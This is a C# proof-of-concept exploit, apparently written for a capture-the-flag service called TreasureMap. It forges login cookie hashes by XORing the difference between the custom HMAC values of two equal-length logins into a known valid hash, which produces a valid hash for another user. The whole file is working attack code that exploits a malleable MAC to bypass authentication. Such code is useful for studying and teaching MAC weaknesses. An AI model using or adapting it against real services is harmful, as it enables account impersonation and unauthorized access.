using System;
using System.Linq;
using System.Security.Cryptography;
using TreasureMap.Crypto;

namespace Vuln1.poc
{
	internal static class Program
	{
		private static void Main()
		{
			CryptoConfig.AddAlgorithm(typeof(RHHE), RHHE.Name);

			string line;
			while ((line = Console.ReadLine()) != null)
			{
				var parts = line.Split('\t');
				if (parts.Length != 3)
				{
					Console.Error.WriteLine($"bad line '{line}'");
					continue;
				}

				var login = parts[0];
				var hash = parts[1];
				var newLogin = parts[2];

				if (login.Length != newLogin.Length)
				{
					Console.Error.WriteLine($"length of old login '{login}' is not equal to length of new login '{newLogin}'");
					continue;
				}

				var oldFakeHash = GetHmac(login);
				var newFakeHash = GetHmac(newLogin);

				var diff = oldFakeHash.Zip(newFakeHash, (b1, b2) => (byte)(b1 ^ b2)).ToArray();
				var hashBytes = Convert.FromBase64String(hash.Replace('-', '+').Replace('_', '/'));
				var newHashBytes = hashBytes.Zip(diff, (b1, b2) => (byte) (b1 ^ b2)).ToArray();
				var newHash = Convert.ToBase64String(newHashBytes).Replace('+', '-').Replace('/', '_');
				Console.WriteLine(newHash);
			}
		}

		private static byte[] GetHmac(string login)
		{
			using (var hmac = HMAC_RHHE.CreateNew())
			{
				return Convert.FromBase64String(hmac.ComputeHash(GetCookieString(login)));
			}
		}

		private static string GetCookieString(string login)
			=> $"login={login}; path=/";
	}
}
